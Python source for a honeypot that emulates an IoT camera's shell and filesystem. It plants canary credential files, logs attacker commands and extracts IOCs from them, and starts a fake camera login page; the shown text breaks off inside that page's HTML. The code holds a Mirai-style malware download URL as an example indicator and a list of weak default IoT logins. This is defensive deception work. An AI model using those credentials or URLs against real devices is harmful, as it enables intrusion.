"""
AegisMirage Phantom Twin Honeypot Engine.

Owner: Member B — honeypot (SSH + web decoy)
Stage: Stage 2 (Phantom Twin Core Decoy & Reverse-Trap Stretch)

Key Responsibilities:
1. In-memory virtual Linux filesystem simulating an IoT smart camera.
2. Bait honeytoken files at multiple depths.
3. High-confidence honeytoken trip detection triggering the internal Rickroll response.
4. Shell command execution (ls, cd, cat, pwd, whoami, uname, curl, wget).
5. Real-time extraction of IOCs: malware hashes (MD5/SHA-256) and C2 addresses/URLs.
6. Emits typed schema.DecoySessionEvent models consumed by Member C (intel.py).
7. Fake camera admin web routes and asyncssh server harness.
"""

from __future__ import annotations

import base64
from dataclasses import dataclass, field
import hashlib
import html
import pathlib
import posixpath
import re
import time
import uuid
from typing import Any, Callable, Dict, List, Optional, Set, Tuple

from fastapi import APIRouter, HTTPException, Request, Response
from fastapi.responses import HTMLResponse, JSONResponse
from pydantic import BaseModel

import schema


# =============================================================================
# In-Memory Virtual Filesystem (IoT Camera OS)
# =============================================================================

# Honeytoken marker used to identify high-confidence bait files
HONEYTOKEN_MARKER = "__HONEYTOKEN__"

# Realistic in-memory IoT Camera Linux filesystem
VIRTUAL_FS: Dict[str, object] = {
    "/": ["bin", "etc", "var", "root", "proc", "home", "emergency_token.cfg"],
    # Honeytoken Bait #0 (Depth 1: /emergency_token.cfg - High-interest root bypass key)
    "/emergency_token.cfg": (
        f"{HONEYTOKEN_MARKER}\n"
        "# MASTER EMERGENCY GRID ACCESS TOKEN\n"
        "EMERGENCY_OVERRIDE_KEY=canary_token_grid_alpha_0911_bypass\n"
        "ISSUED_TO=ICCC_CENTRAL_SURVEILLANCE\n"
    ),
    "/bin": ["sh", "busybox", "ls", "cat", "pwd", "uname", "whoami", "curl", "wget", "head", "tail", "more", "less"],
    "/proc": ["cpuinfo", "version", "uptime"],
    "/proc/version": "Linux version 5.10.0-aegis-arm64 (gcc 10.2.1) #1 PREEMPT\n",
    "/etc": ["passwd", "shadow", "hosts", "issue", "camera"],
    "/etc/issue": "AegisOS SmartCam IoT Linux 5.10-arm64 \\n \\l\n",
    "/etc/passwd": (
        "root:x:0:0:root:/root:/bin/sh\n"
        "admin:x:1000:1000:Camera Admin:/home/admin:/bin/sh\n"
        "operator:x:1001:1001:Surveillance Operator:/home/operator:/bin/sh\n"
    ),
    "/etc/camera": ["config.json", "credentials.conf"],
    "/etc/camera/config.json": (
        '{\n  "camera_id": "cam-smart-04",\n  "stream": "rtsp://localhost:554/live",\n'
        '  "resolution": "1920x1080",\n  "firmware": "v2.14-stable"\n}\n'
    ),
    # Honeytoken Bait #1 (Depth 2: /etc/camera/credentials.conf - Master camera access token)
    "/etc/camera/credentials.conf": (
        f"{HONEYTOKEN_MARKER}\n"
        "# MASTER CAMERA ACCESS TOKEN\n"
        "CAM_TOKEN=sec_token_canary_cam04_9921_x\n"
        "BACKUP_CLOUD_SYNC=https://sync.aegismirage-internal.local/keys\n"
    ),
    "/root": [".bashrc", "keys", "firmware_update.sh"],
    # Honeytoken Bait #2 (Depth 3: /root/keys/vault_token.key - Infrastructure secrets)
    "/root/keys": ["vault_token.key", "id_rsa"],
    "/root/keys/vault_token.key": (
        f"{HONEYTOKEN_MARKER}\n"
        "s.vault_canary_token_prod_infrastructure_4418\n"
    ),
    "/var": ["log", "backup", "www"],
    "/var/log": ["messages", "auth.log"],
    # Honeytoken Bait #3 (Depth 3: /var/backup/firmware_pass.enc - Encrypted firmware secrets)
    "/var/backup": ["firmware_pass.enc", "db_dump.sql"],
    "/var/backup/firmware_pass.enc": (
        f"{HONEYTOKEN_MARKER}\n"
        "ENC_PASSPHRASE=mirage_vault_honeytoken_alpha_3991\n"
    ),
    "/home": ["admin", "operator"],
    "/home/admin": ["readme.txt"],
    "/home/admin/readme.txt": "Authorized maintenance only. Contact ICCC operations for credentials.\n",
    # Honeytoken Bait #4 (Depth 3: /home/operator/.aws_keys - Cloud storage canary)
    "/home/operator": [".aws_keys", ".bashrc"],
    "/home/operator/.aws_keys": (
        f"{HONEYTOKEN_MARKER}\n"
        "[default]\n"
        "aws_access_key_id=AKIAIOSFODNN7CANARYB\n"
        "aws_secret_access_key=wJalrXUtnFEMI/K7MDENG/bPxRfiCYCANARYKEY\n"
        "region=ap-south-1\n"
    ),
    "/home/operator/.bashrc": "export PATH=$PATH:/bin\n",
}

# The Sandboxed Rickroll Response Payload (never touches external systems)
RICKROLL_PAYLOAD = r"""
================================================================================
[*] DECRYPTING SENSITIVE CREDENTIAL ARCHIVE...
[*] ACCESS GRANTED - EXTRACTING SECRETS...
================================================================================
  _   _ _____ _   _ _____ ____    ____   ___  _   _ _   _    _    
 | \ | | ____| | | | ____|  _ \  / ___| / _ \| \ | | \ | |  / \   
 |  \| |  _| | | | |  _| | |_) | \___ \| | | |  \| |  \| | / _ \  
 | |\  | |___ \ \_/ / |___|  _ <   ___) | |_| | |\  | |\  |/ ___ \ 
 |_| \_|_____| \___/|_____|_| \_\ |____/ \___/|_| \_|_| \_/_/   \_\

 🎵 NEVER GONNA GIVE YOU UP, NEVER GONNA LET YOU DOWN 🎵
 🎵 NEVER GONNA RUN AROUND AND DESERT YOU 🎵
 🎵 NEVER GONNA MAKE YOU CRY, NEVER GONNA SAY GOODBYE 🎵
 🎵 NEVER GONNA TELL A LIE AND HURT YOU 🎵
================================================================================
[AEGISMIRAGE PHANTOM TWIN SANDBOX - TRAP TRIGGERED]
HONEYTOKEN COMPROMISE DETECTED.
Your session has been tagged with MAXIMUM CONFIDENCE.
All command telemetry, IOCs, and session metrics are recorded.
================================================================================
"""


# =============================================================================
# Constants & Quarantine Configuration
# =============================================================================

# Maximum upload size for demo artifacts (2MB)
MAX_UPLOAD_SIZE_BYTES = 2 * 1024 * 1024

# Local directory where uploaded artifacts are stored with generated filenames
# Strictly outside web-served directories and excluded from Git
QUARANTINE_DIR = pathlib.Path("quarantine")


def get_quarantine_dir() -> pathlib.Path:
    """Ensures quarantine directory exists and returns its path."""
    QUARANTINE_DIR.mkdir(parents=True, exist_ok=True)
    return QUARANTINE_DIR


# =============================================================================
# Static String & IOC Extraction (Non-Executing)
# =============================================================================

# Matches 64-char hex (SHA-256) or 32-char hex (MD5)
REGEX_SHA256 = re.compile(r"\b[a-fA-F0-9]{64}\b")
REGEX_MD5 = re.compile(r"\b[a-fA-F0-9]{32}\b")

# Matches URLs with http/https/ftp/tftp/irc e.g. http://194.26.29.112:8080/mirai.x86
REGEX_URL_C2 = re.compile(r"\b(?:https?|tftp|ftp|irc)://[a-zA-Z0-9.-]+(?::[0-9]{2,5})?(?:/[^\s\"'<>]*)?")

# Matches raw IP with optional port e.g. 194.26.29.112:8080
REGEX_IP_PORT = re.compile(r"\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?):[0-9]{2,5}\b")

# Matches raw IPv4 address
REGEX_IP = re.compile(r"\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b")

IGNORE_IPS = {"127.0.0.1", "0.0.0.0", "255.255.255.255", "localhost"}


def extract_strings_from_bytes(data: bytes, min_len: int = 4, max_strings: int = 5000) -> List[str]:
    """
    Statically extracts printable ASCII strings from arbitrary binary data.
    Runs entirely in memory with zero execution. Bounded to max_strings.
    """
    strings: List[str] = []
    current: List[int] = []
    for b in data:
        if 32 <= b <= 126:
            current.append(b)
        else:
            if len(current) >= min_len:
                strings.append(bytes(current).decode("ascii", errors="replace"))
                if len(strings) >= max_strings:
                    break
            current.clear()
    if len(current) >= min_len and len(strings) < max_strings:
        strings.append(bytes(current).decode("ascii", errors="replace"))
    return strings


def extract_file_iocs(file_bytes: bytes) -> Tuple[str, str, List[str], List[str], List[str]]:
    """
    Statically analyzes received file bytes WITHOUT execution or external network calls.
    Returns: (sha256, md5, candidate_urls, candidate_ips, strings_sample)
    
    Epistemic notes:
    - sha256 is the cryptographic digest of the received file bytes, NOT proof that the file is malware.
    - Extracted URLs and IPs are candidate indicators, NOT automatically confirmed C2 servers.
    """
    sha256_hash = hashlib.sha256(file_bytes).hexdigest()
    md5_hash = hashlib.md5(file_bytes).hexdigest()
    
    extracted_strings = extract_strings_from_bytes(file_bytes)
    candidate_urls: List[str] = []
    candidate_ips: List[str] = []
    
    for s in extracted_strings:
        # Check URLs
        for url in REGEX_URL_C2.findall(s):
            if url not in candidate_urls:
                candidate_urls.append(url)
        # Check IP:port
        for ip_port in REGEX_IP_PORT.findall(s):
            ip_only = ip_port.split(":")[0]
            if ip_only not in IGNORE_IPS and ip_port not in candidate_ips:
                candidate_ips.append(ip_port)
        # Check raw IPs
        for ip in REGEX_IP.findall(s):
            if ip not in IGNORE_IPS and not any(ip in existing for existing in candidate_ips):
                candidate_ips.append(ip)

    return sha256_hash, md5_hash, candidate_urls, candidate_ips, extracted_strings[:50]


def extract_iocs(text: str) -> Tuple[Optional[str], Optional[str]]:
    """
    Scans a shell command line string for candidate hashes and C2 addresses.
    Returns (malware_hash, c2_address).
    """
    malware_hash: Optional[str] = None
    c2_address: Optional[str] = None

    # Check for SHA-256 first (strongest IOC)
    sha_match = REGEX_SHA256.search(text)
    if sha_match:
        malware_hash = sha_match.group(0).lower()
    else:
        # Check for MD5
        md5_match = REGEX_MD5.search(text)
        if md5_match:
            malware_hash = md5_match.group(0).lower()

    # Check for C2 URLs (e.g. from curl, wget, tftp)
    url_match = REGEX_URL_C2.search(text)
    if url_match:
        c2_address = url_match.group(0)
    else:
        ip_port_match = REGEX_IP_PORT.search(text)
        if ip_port_match:
            c2_address = ip_port_match.group(0)

    return malware_hash, c2_address


# =============================================================================
# File Submission & Provenance Record
# =============================================================================

@dataclass
class FileSubmissionRecord:
    """Detailed local record of an uploaded artifact (retained for Person C and audit trail)."""
    submission_id: str
    received_at: float
    original_filename: str
    quarantine_filename: str
    size_bytes: int
    sha256: str
    md5: str
    candidate_urls: List[str] = field(default_factory=list)
    candidate_ips: List[str] = field(default_factory=list)
    strings_sample: List[str] = field(default_factory=list)

    def to_dict(self) -> Dict[str, Any]:
        return {
            "submission_id": self.submission_id,
            "received_at": self.received_at,
            "original_filename": self.original_filename,
            "quarantine_filename": self.quarantine_filename,
            "size_bytes": self.size_bytes,
            "sha256": self.sha256,
            "md5": self.md5,
            "candidate_urls": list(self.candidate_urls),
            "candidate_ips": list(self.candidate_ips),
            "strings_sample": list(self.strings_sample),
        }


# =============================================================================
# Decoy Session State & Management
# =============================================================================

class DecoySession:
    """Represents an active interactive session trapped inside the honeypot."""

    def __init__(self, session_id: str, source_ip: str, service: str = "ssh") -> None:
        self.session_id: str = session_id
        self.source_ip: str = source_ip
        self.service: str = service
        self.failed_logins: int = 0
        self.commands: List[str] = []
        self.honeytoken_hit: bool = False
        self.current_dir: str = "/"
        self.created_at: float = time.time()
        self.last_active: float = time.time()

        # Detailed local provenance records (retained for Person C clustering & forensics)
        self.file_submissions: List[FileSubmissionRecord] = []
        self.referenced_urls: List[str] = []
        self.referenced_files: List[str] = []
        self.cmd_hashes: List[str] = []
        self.cmd_c2_candidates: List[str] = []

    def to_event(self) -> schema.DecoySessionEvent:
        """
        Export session state strictly conforming to shared schema.py.
        
        Deterministic Selection Policy for Single-Slot Fields:
        -----------------------------------------------------
        1. malware_hash:
           - Priority 1: SHA-256 digest of the most recently received file submission.
           - Priority 2: SHA-256 discovered from shell command line inputs.
           - Priority 3: MD5 discovered from shell command line inputs.
           Epistemic note: malware_hash is a submitted file's digest, NOT proof that the file is malware.
        
        2. c2_address:
           - Priority 1: Candidate URL with explicit port from file submissions (e.g. http://...:8080/...).
           - Priority 2: Candidate plain URL from file submissions.
           - Priority 3: Candidate IP:port from file submissions.
           - Priority 4: Candidate URL referenced in shell command lines (curl/wget).
           - Priority 5: Candidate IP:port referenced in shell command lines.
           Epistemic note: c2_address is an extracted candidate indicator, NOT confirmed C2.
        
        Limitation for Person C:
        The shared schema provides single scalar fields for malware_hash and c2_address.
        Full multi-indicator provenance is retained in session.get_provenance_summary().
        """
        # 1. Deterministic malware_hash selection
        selected_hash: Optional[str] = None
        if self.file_submissions:
            selected_hash = self.file_submissions[-1].sha256
        elif self.cmd_hashes:
            selected_hash = self.cmd_hashes[-1]

        # 2. Deterministic c2_address selection
        selected_c2: Optional[str] = None
        # Check file submissions first (most recent first)
        for sub in reversed(self.file_submissions):
            urls_with_port = [u for u in sub.candidate_urls if re.search(r":[0-9]{2,5}", u)]
            if urls_with_port:
                selected_c2 = urls_with_port[0]
                break
            if sub.candidate_urls:
                selected_c2 = sub.candidate_urls[0]
                break
            if sub.candidate_ips:
                selected_c2 = sub.candidate_ips[0]
                break

        # If none from file submissions, check command lines
        if not selected_c2:
            urls_with_port = [u for u in self.referenced_urls if re.search(r":[0-9]{2,5}", u)]
            if urls_with_port:
                selected_c2 = urls_with_port[0]
            elif self.referenced_urls:
                selected_c2 = self.referenced_urls[0]
            elif self.cmd_c2_candidates:
                selected_c2 = self.cmd_c2_candidates[-1]

        return schema.DecoySessionEvent(
            session_id=self.session_id,
            source_ip=self.source_ip,
            service=self.service,
            failed_logins=self.failed_logins,
            commands=list(self.commands),
            honeytoken_hit=self.honeytoken_hit,
            malware_hash=selected_hash,
            c2_address=selected_c2,
        )

    def get_provenance_summary(self) -> Dict[str, Any]:
        """Detailed local provenance report for Person C and audit forensics."""
        return {
            "session_id": self.session_id,
            "source_ip": self.source_ip,
            "service": self.service,
            "honeytoken_hit": self.honeytoken_hit,
            "file_submissions_count": len(self.file_submissions),
            "file_submissions": [s.to_dict() for s in self.file_submissions],
            "referenced_urls": list(self.referenced_urls),
            "referenced_files": list(self.referenced_files),
            "command_hashes": list(self.cmd_hashes),
            "command_c2_candidates": list(self.cmd_c2_candidates),
            "schema_event": self.to_event().model_dump(),
            "epistemic_disclaimer": (
                "malware_hash is an empirical SHA-256 digest of received bytes, not proof of malice. "
                "c2_address is a static candidate indicator, not verified C2 infrastructure. "
                "honeytoken_hit is an observed interaction with deception bait, not proof of individual human identity."
            ),
        }


# Safe credential summary helper ensuring raw passwords are never logged or stored
def safe_credential_summary(password: str) -> str:
    """
    Converts a raw password into a non-reversible cryptographic fingerprint
    and masked string. Raw passwords are NEVER logged or stored.
    """
    if not password:
        return "<empty>"
    if password.startswith("masked:"):
        return password
    sha_fp = hashlib.sha256(password.encode("utf-8")).hexdigest()[:12]
    masked = password[0] + ("*" * max(1, len(password) - 2)) + (password[-1] if len(password) > 1 else "")
    return f"masked:{masked}[sha256:{sha_fp}]"


# Type alias for session event listeners (Person C intel clustering)
SessionEventListener = Callable[[schema.DecoySessionEvent], None]


class DecoyManager:
    """Manages all active honeypot sessions, virtual execution, and event subscriptions."""

    def __init__(self) -> None:
        self.sessions: Dict[str, DecoySession] = {}
        self._listeners: List[SessionEventListener] = []

    def reset(self) -> None:
        """Clear all sessions for test runs."""
        self.sessions.clear()

    def register_listener(self, listener: SessionEventListener) -> None:
        """Provide Person C (intel.py) with a callback/subscription interface."""
        if listener not in self._listeners:
            self._listeners.append(listener)

    def unregister_listener(self, listener: SessionEventListener) -> None:
        """Unsubscribe a session event listener."""
        if listener in self._listeners:
            self._listeners.remove(listener)

    def _notify_listeners(self, event: schema.DecoySessionEvent) -> None:
        """Dispatches session events to all registered listeners."""
        for listener in list(self._listeners):
            try:
                listener(event)
            except Exception as e:
                print(f"[Decoy] Error in session event listener: {e}")

    def get_or_create_session(
        self,
        session_id: Optional[str] = None,
        source_ip: str = "127.0.0.1",
        service: str = "ssh",
    ) -> DecoySession:
        """Retrieve existing session or spawn a new tracked session."""
        if not session_id or session_id not in self.sessions:
            sid = session_id or f"sess-{uuid.uuid4().hex[:8]}"
            session = DecoySession(session_id=sid, source_ip=source_ip, service=service)
            self.sessions[sid] = session
            print(f"[Decoy] Spawned new {service.upper()} decoy session {sid} for {source_ip}")
            return session
        return self.sessions[session_id]

    def record_login_attempt(
        self,
        session_id: str,
        source_ip: str,
        service: str,
        username: str,
        password: str,
        success: bool = False,
    ) -> schema.DecoySessionEvent:
        """
        Log an authentication attempt against the decoy.
        Passwords are safe-summarized so raw plaintext is NEVER stored in session state.
        """
        session = self.get_or_create_session(session_id, source_ip, service)
        masked_pwd = safe_credential_summary(password)

        if not success:
            session.failed_logins += 1
            print(f"[Decoy] Auth failure #{session.failed_logins} on {service} by {source_ip} ({username}:{masked_pwd})")
        else:
            print(f"[Decoy] Auth SUCCESS on decoy {service} by {source_ip} ({username}:{masked_pwd})")
        
        session.last_active = time.time()
        event = session.to_event()
        self._notify_listeners(event)
        return event

    def execute_command(self, session_id: str, cmd_line: str) -> Tuple[str, schema.DecoySessionEvent]:
        """
        Executes a command inside the virtual filesystem sandbox.
        Returns (stdout_text, updated_DecoySessionEvent).
        Zero OS execution: strictly evaluated against in-memory dictionary.
        """
        session = self.get_or_create_session(session_id)
        cmd_line = cmd_line.strip()
        if not cmd_line:
            return "", session.to_event()

        session.commands.append(cmd_line)
        session.last_active = time.time()
        print(f"[Decoy] [{session.session_id} @ {session.source_ip}]$ {cmd_line}")

        # Step 1: Parse tokens and record referenced URLs and filenames separately from uploads
        parts = cmd_line.split()
        verb = parts[0].lower() if parts else ""
        args = parts[1:] if len(parts) > 1 else []

        # Statically extract hashes from command line
        for h in REGEX_SHA256.findall(cmd_line):
            h_clean = h.lower()
            if h_clean not in session.cmd_hashes:
                session.cmd_hashes.append(h_clean)
                print(f"[Decoy] [*] Command-line hash observed: {h_clean}")
        for h in REGEX_MD5.findall(cmd_line):
            h_clean = h.lower()
            if h_clean not in session.cmd_hashes:
                session.cmd_hashes.append(h_clean)
                print(f"[Decoy] [*] Command-line hash observed: {h_clean}")

        # Statically extract referenced URLs from command line (distinct from uploads)
        for u in REGEX_URL_C2.findall(cmd_line):
            if u not in session.referenced_urls:
                session.referenced_urls.append(u)
                print(f"[Decoy] [*] Referenced URL observed: {u}")

        # Statically extract candidate C2 addresses/IPs from command line
        for ip_port in REGEX_IP_PORT.findall(cmd_line):
            if ip_port not in session.cmd_c2_candidates and ip_port.split(":")[0] not in IGNORE_IPS:
                session.cmd_c2_candidates.append(ip_port)
                print(f"[Decoy] [*] Candidate C2 address observed: {ip_port}")

        # Statically extract referenced filenames/paths from command line (distinct from uploads)
        for idx, token in enumerate(parts):
            if token in ("-o", "-O", ">") and idx + 1 < len(parts):
                target_f = parts[idx + 1]
                if target_f not in session.referenced_files:
                    session.referenced_files.append(target_f)
            elif token.startswith("/") and len(token) > 1:
                if token not in session.referenced_files:
                    session.referenced_files.append(token)
            elif re.search(r"\.(?:sh|bin|elf|py|exe|conf|cfg|key|txt)$", token, re.IGNORECASE):
                if token not in session.referenced_files:
                    session.referenced_files.append(token)

        # Step 2: Virtual Shell Execution (zero host subprocesses)
        if verb == "pwd":
            out = f"{session.current_dir}\n"

        elif verb == "whoami":
            out = "root\n"

        elif verb == "uname" or verb == "uname -a":
            out = "Linux aegis-smartcam-01 5.10.0-arm64 #1 PREEMPT aarch64 GNU/Linux\n"

        elif verb == "ls":
            target_path = session.current_dir if not args else self._resolve_path(session.current_dir, args[0])
            if target_path in VIRTUAL_FS:
                node = VIRTUAL_FS[target_path]
                if isinstance(node, list):
                    out = "  ".join(node) + "\n"
                else:
                    out = f"{posixpath.basename(target_path)}\n"
            else:
                out = f"ls: cannot access '{args[0] if args else ''}': No such file or directory\n"

        elif verb == "cd":
            if not args or args[0] in ("~", ""):
                session.current_dir = "/root"
                out = ""
            else:
                target_path = self._resolve_path(session.current_dir, args[0])
                if target_path in VIRTUAL_FS and isinstance(VIRTUAL_FS[target_path], list):
                    session.current_dir = target_path
                    out = ""
                else:
                    out = f"cd: {args[0]}: No such file or directory\n"

        elif verb in ("cat", "head", "tail", "more", "less"):
            file_args = [a for a in args if not a.startswith("-")]
            if not file_args:
                out = f"{verb}: missing file operand\n"
            else:
                target_arg = file_args[0]
                target_path = self._resolve_path(session.current_dir, target_arg)
                if target_path in VIRTUAL_FS:
                    content = VIRTUAL_FS[target_path]
                    if isinstance(content, str):
                        # CHECK FOR HONEYTOKEN BAIT (Read operation triggers detection)
                        if HONEYTOKEN_MARKER in content:
                            session.honeytoken_hit = True
                            print(f"[Decoy] [!] HONEYTOKEN TRIGGERED in session {session.session_id} by {session.source_ip} on {target_path} via {verb}!")
                            out = RICKROLL_PAYLOAD
                        else:
                            if verb == "head":
                                lines = content.splitlines(keepends=True)[:10]
                                out = "".join(lines)
                            elif verb == "tail":
                                lines = content.splitlines(keepends=True)[-10:]
                                out = "".join(lines)
                            else:
                                out = content
                    else:
                        out = f"{verb}: {target_arg}: Is a directory\n"
                else:
                    out = f"{verb}: {target_arg}: No such file or directory\n"

        elif verb in ("curl", "wget", "tftp"):
            out = "Connected to remote host... File saved.\n"

        elif verb == "help":
            out = (
                "AegisOS SmartCam Diagnostic Shell\n"
                "Supported commands: ls, cd, cat, head, tail, more, less, pwd, whoami, uname, curl, wget, help, exit\n"
            )

        elif verb == "exit":
            out = "Session disconnected by remote host.\n"

        else:
            out = f"sh: {verb}: command not found\n"

        event = session.to_event()
        self._notify_listeners(event)
        return out, event

    def _resolve_path(self, current: str, path: str) -> str:
        """
        Resolve a relative or absolute Unix path within the virtual filesystem.
        Uses posixpath.normpath to strictly enforce root-bounded path resolution,
        preventing directory traversal out of the virtual filesystem root (/).
        """
        if not path:
            return current
        if path.startswith("/"):
            resolved = posixpath.normpath(path)
        else:
            resolved = posixpath.normpath(posixpath.join(current, path))
        if not resolved.startswith("/"):
            resolved = "/" + resolved
        return resolved

    def close_session(self, session_id: str) -> Optional[schema.DecoySessionEvent]:
        """
        Preserve the final session update on disconnect and notify all listeners.
        """
        if session_id in self.sessions:
            session = self.sessions[session_id]
            session.last_active = time.time()
            event = session.to_event()
            self._notify_listeners(event)
            print(f"[Decoy] Final session state preserved for {session_id} on disconnect.")
            return event
        return None

    def get_all_session_events(self) -> List[schema.DecoySessionEvent]:
        """Export all session events for Member C and the dashboard."""
        return [s.to_event() for s in self.sessions.values()]

    def get_session_event(self, session_id: str) -> Optional[schema.DecoySessionEvent]:
        """Retrieve a specific session event."""
        if session_id in self.sessions:
            return self.sessions[session_id].to_event()
        return None

    def process_file_submission(
        self,
        session_id: str,
        original_filename: str,
        file_bytes: bytes,
        source_ip: str = "127.0.0.1",
    ) -> Tuple[FileSubmissionRecord, schema.DecoySessionEvent]:
        """
        Processes an uploaded file evidence artifact:
        - Enforces MAX_UPLOAD_SIZE_BYTES (2MB) limit.
        - Computes SHA-256 and MD5 directly from actual received file bytes.
        - Statically extracts potential URLs, IPs, and C2 candidates without execution.
        - Stores the upload with a generated random filename in the quarantine directory
          (outside web-served directories, excluded from Git).
        - Records full detailed provenance in FileSubmissionRecord.
        - Updates the session, emits an updated DecoySessionEvent, and notifies listeners.
        - Never executes files or contacts extracted destinations.
        """
        if len(file_bytes) > MAX_UPLOAD_SIZE_BYTES:
            raise ValueError(f"Payload size ({len(file_bytes)} bytes) exceeds maximum limit ({MAX_UPLOAD_SIZE_BYTES} bytes)")

        # Compute hashes directly from raw received bytes
        sha256_hash = hashlib.sha256(file_bytes).hexdigest()
        md5_hash = hashlib.md5(file_bytes).hexdigest()

        # Non-executing static analysis of bytes
        _, _, candidate_urls, candidate_ips, strings_sample = extract_file_iocs(file_bytes)

        # Store with generated filename outside web-served directories
        submission_id = f"sub-{uuid.uuid4().hex[:8]}"
        quarantine_dir = get_quarantine_dir()
        quarantine_filename = f"artifact_{sha256_hash[:16]}_{uuid.uuid4().hex[:6]}.bin"
        quarantine_path = quarantine_dir / quarantine_filename
        quarantine_path.write_bytes(file_bytes)

        record = FileSubmissionRecord(
            submission_id=submission_id,
            received_at=time.time(),
            original_filename=original_filename,
            quarantine_filename=quarantine_filename,
            size_bytes=len(file_bytes),
            sha256=sha256_hash,
            md5=md5_hash,
            candidate_urls=candidate_urls,
            candidate_ips=candidate_ips,
            strings_sample=strings_sample,
        )

        session = self.get_or_create_session(session_id, source_ip=source_ip)
        session.file_submissions.append(record)
        session.last_active = time.time()

        print(
            f"[Decoy] File evidence received for session {session_id}: "
            f"name='{original_filename}', size={len(file_bytes)}B, sha256={sha256_hash}, "
            f"stored='{quarantine_filename}', URLs={len(candidate_urls)}, IPs={len(candidate_ips)}"
        )

        event = session.to_event()
        self._notify_listeners(event)
        return record, event

    def get_provenance(self, session_id: str) -> Optional[Dict[str, Any]]:
        """Retrieve detailed provenance record for a specific session."""
        if session_id in self.sessions:
            return self.sessions[session_id].get_provenance_summary()
        return None



# Single in-memory manager instance for the single-process backend
_decoy_manager = DecoyManager()


# =============================================================================
# Public Module API
# =============================================================================

def record_decoy_login(
    session_id: str,
    source_ip: str,
    service: str,
    username: str,
    password: str,
    success: bool = False,
) -> schema.DecoySessionEvent:
    """Record a login attempt on SSH or Web Decoy."""
    return _decoy_manager.record_login_attempt(session_id, source_ip, service, username, password, success)


def execute_decoy_command(session_id: str, cmd_line: str) -> Tuple[str, schema.DecoySessionEvent]:
    """Execute a command in the decoy sandbox."""
    return _decoy_manager.execute_command(session_id, cmd_line)


def submit_file_evidence(
    session_id: str,
    original_filename: str,
    file_bytes: bytes,
    source_ip: str = "127.0.0.1",
) -> Tuple[FileSubmissionRecord, schema.DecoySessionEvent]:
    """
    Public module function to submit file evidence to Person B's decoy sandbox.
    Computes SHA-256, stores in quarantine, extracts static IOCs without execution,
    and returns (submission_record, updated_DecoySessionEvent).
    """
    return _decoy_manager.process_file_submission(session_id, original_filename, file_bytes, source_ip)


def get_session_provenance(session_id: str) -> Optional[Dict[str, Any]]:
    """Retrieve full local provenance details for a session."""
    return _decoy_manager.get_provenance(session_id)


def get_active_sessions() -> List[schema.DecoySessionEvent]:
    """Get all current DecoySessionEvents."""
    return _decoy_manager.get_all_session_events()


def get_session_by_id(session_id: str) -> Optional[schema.DecoySessionEvent]:
    """Get DecoySessionEvent by ID."""
    return _decoy_manager.get_session_event(session_id)


def flag_honeytoken_hit(session_id: str) -> Optional[schema.DecoySessionEvent]:
    """Flag a session as having tripped a honeytoken trap."""
    if session_id in _decoy_manager.sessions:
        _decoy_manager.sessions[session_id].honeytoken_hit = True
        return _decoy_manager.sessions[session_id].to_event()
    return None


def register_session_listener(listener: Callable[[schema.DecoySessionEvent], None]) -> None:
    """Provide Person C (intel.py) with a callback/subscription interface for session events."""
    _decoy_manager.register_listener(listener)


def unregister_session_listener(listener: Callable[[schema.DecoySessionEvent], None]) -> None:
    """Unsubscribe a session event listener."""
    _decoy_manager.unregister_listener(listener)


def end_decoy_session(session_id: str) -> Optional[schema.DecoySessionEvent]:
    """Preserve the final session update on disconnect and notify all listeners."""
    return _decoy_manager.close_session(session_id)


def reset_decoy_state() -> None:
    """Reset all decoy sessions."""
    _decoy_manager.reset()


async def start_ssh_decoy(host: str = "127.0.0.1", port: int = 2222) -> None:
    """Start the real asyncssh decoy server listener."""
    import ssh_decoy
    controller = ssh_decoy.get_ssh_controller()
    controller.host = host
    controller.port = port
    await controller.start()


async def stop_ssh_decoy() -> None:
    """Stop the real asyncssh decoy server listener."""
    import ssh_decoy
    await ssh_decoy.get_ssh_controller().stop()


async def start_mqtt_decoy(host: str = "127.0.0.1", port: int = 1883) -> None:
    """Start the real MQTT 3.1.1 decoy protocol server (isolated / optional)."""
    import mqtt_decoy
    server = mqtt_decoy.get_mqtt_server()
    server.host = host
    server.port = port
    await server.start()


async def stop_mqtt_decoy() -> None:
    """Stop the real MQTT decoy protocol server."""
    import mqtt_decoy
    await mqtt_decoy.get_mqtt_server().stop()


# Explicit async startup and shutdown hooks for FastAPI lifespan or test harnesses
async def startup(host: str = "127.0.0.1", port: int = 2222, start_ssh: bool = True) -> None:
    """Explicit async startup hook for Person B honeypot core."""
    if start_ssh:
        await start_ssh_decoy(host=host, port=port)
    print(f"[Decoy] Honeypot core initialized (SSH={start_ssh}).")


async def shutdown() -> None:
    """Explicit async shutdown hook for Person B honeypot core."""
    await stop_ssh_decoy()
    print("[Decoy] Honeypot core shut down cleanly.")


# =============================================================================
# Fake Camera Web Admin (FastAPI APIRouter)
# =============================================================================

# Known IoT / demo credentials accepted on the fake camera portal
DEMO_WEB_CREDENTIALS: Set[Tuple[str, str]] = {
    ("admin", "admin"),
    ("admin", "123456"),
    ("admin", "password"),
    ("root", "root"),
    ("root", "123456"),
    ("default", "default"),
    ("operator", "SmartCity2026!"),
}


def render_camera_login_html(error: Optional[str] = None, prefill_user: Optional[str] = None) -> str:
    """
    Renders the fake camera login page.
    All dynamic inputs are strictly escaped with html.escape to neutralize injection.
    """
    error_banner = ""
    if error:
        safe_error = html.escape(error, quote=True)
        error_banner = f'<div class="alert">{safe_error}</div>'

    safe_user = html.escape(prefill_user or "", quote=True)

    return f"""<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>AegisCam Enterprise IoT Portal — Login</title>
  <style>
    body {{
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      background: #090d16;
      color: #e6edf3;
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      margin: 0;
    }}
    .box {{
      background: #131926;
      border: 1px solid #2d3748;
      border-radius: 10px;
      padding: 2.2rem;
      width: 360px;
      box-shadow: 0 12px 32px rgba(0,0,0,0.6);
    }}
    .badge {{
      display: inline-block;
      font-size: 0.7rem;
      font-weight: 700;
      text-transform: uppercase;
      background: #1f3a5f;
      color: #58a6ff;
      padding: 0.2rem 0.55rem;
      border-radius: 4px;
      margin-bottom: 0.75rem;
    }}
    h2 {{ margin: 0 0 0.35rem; font-size: 1.35rem; color: #f0f6fc; }}
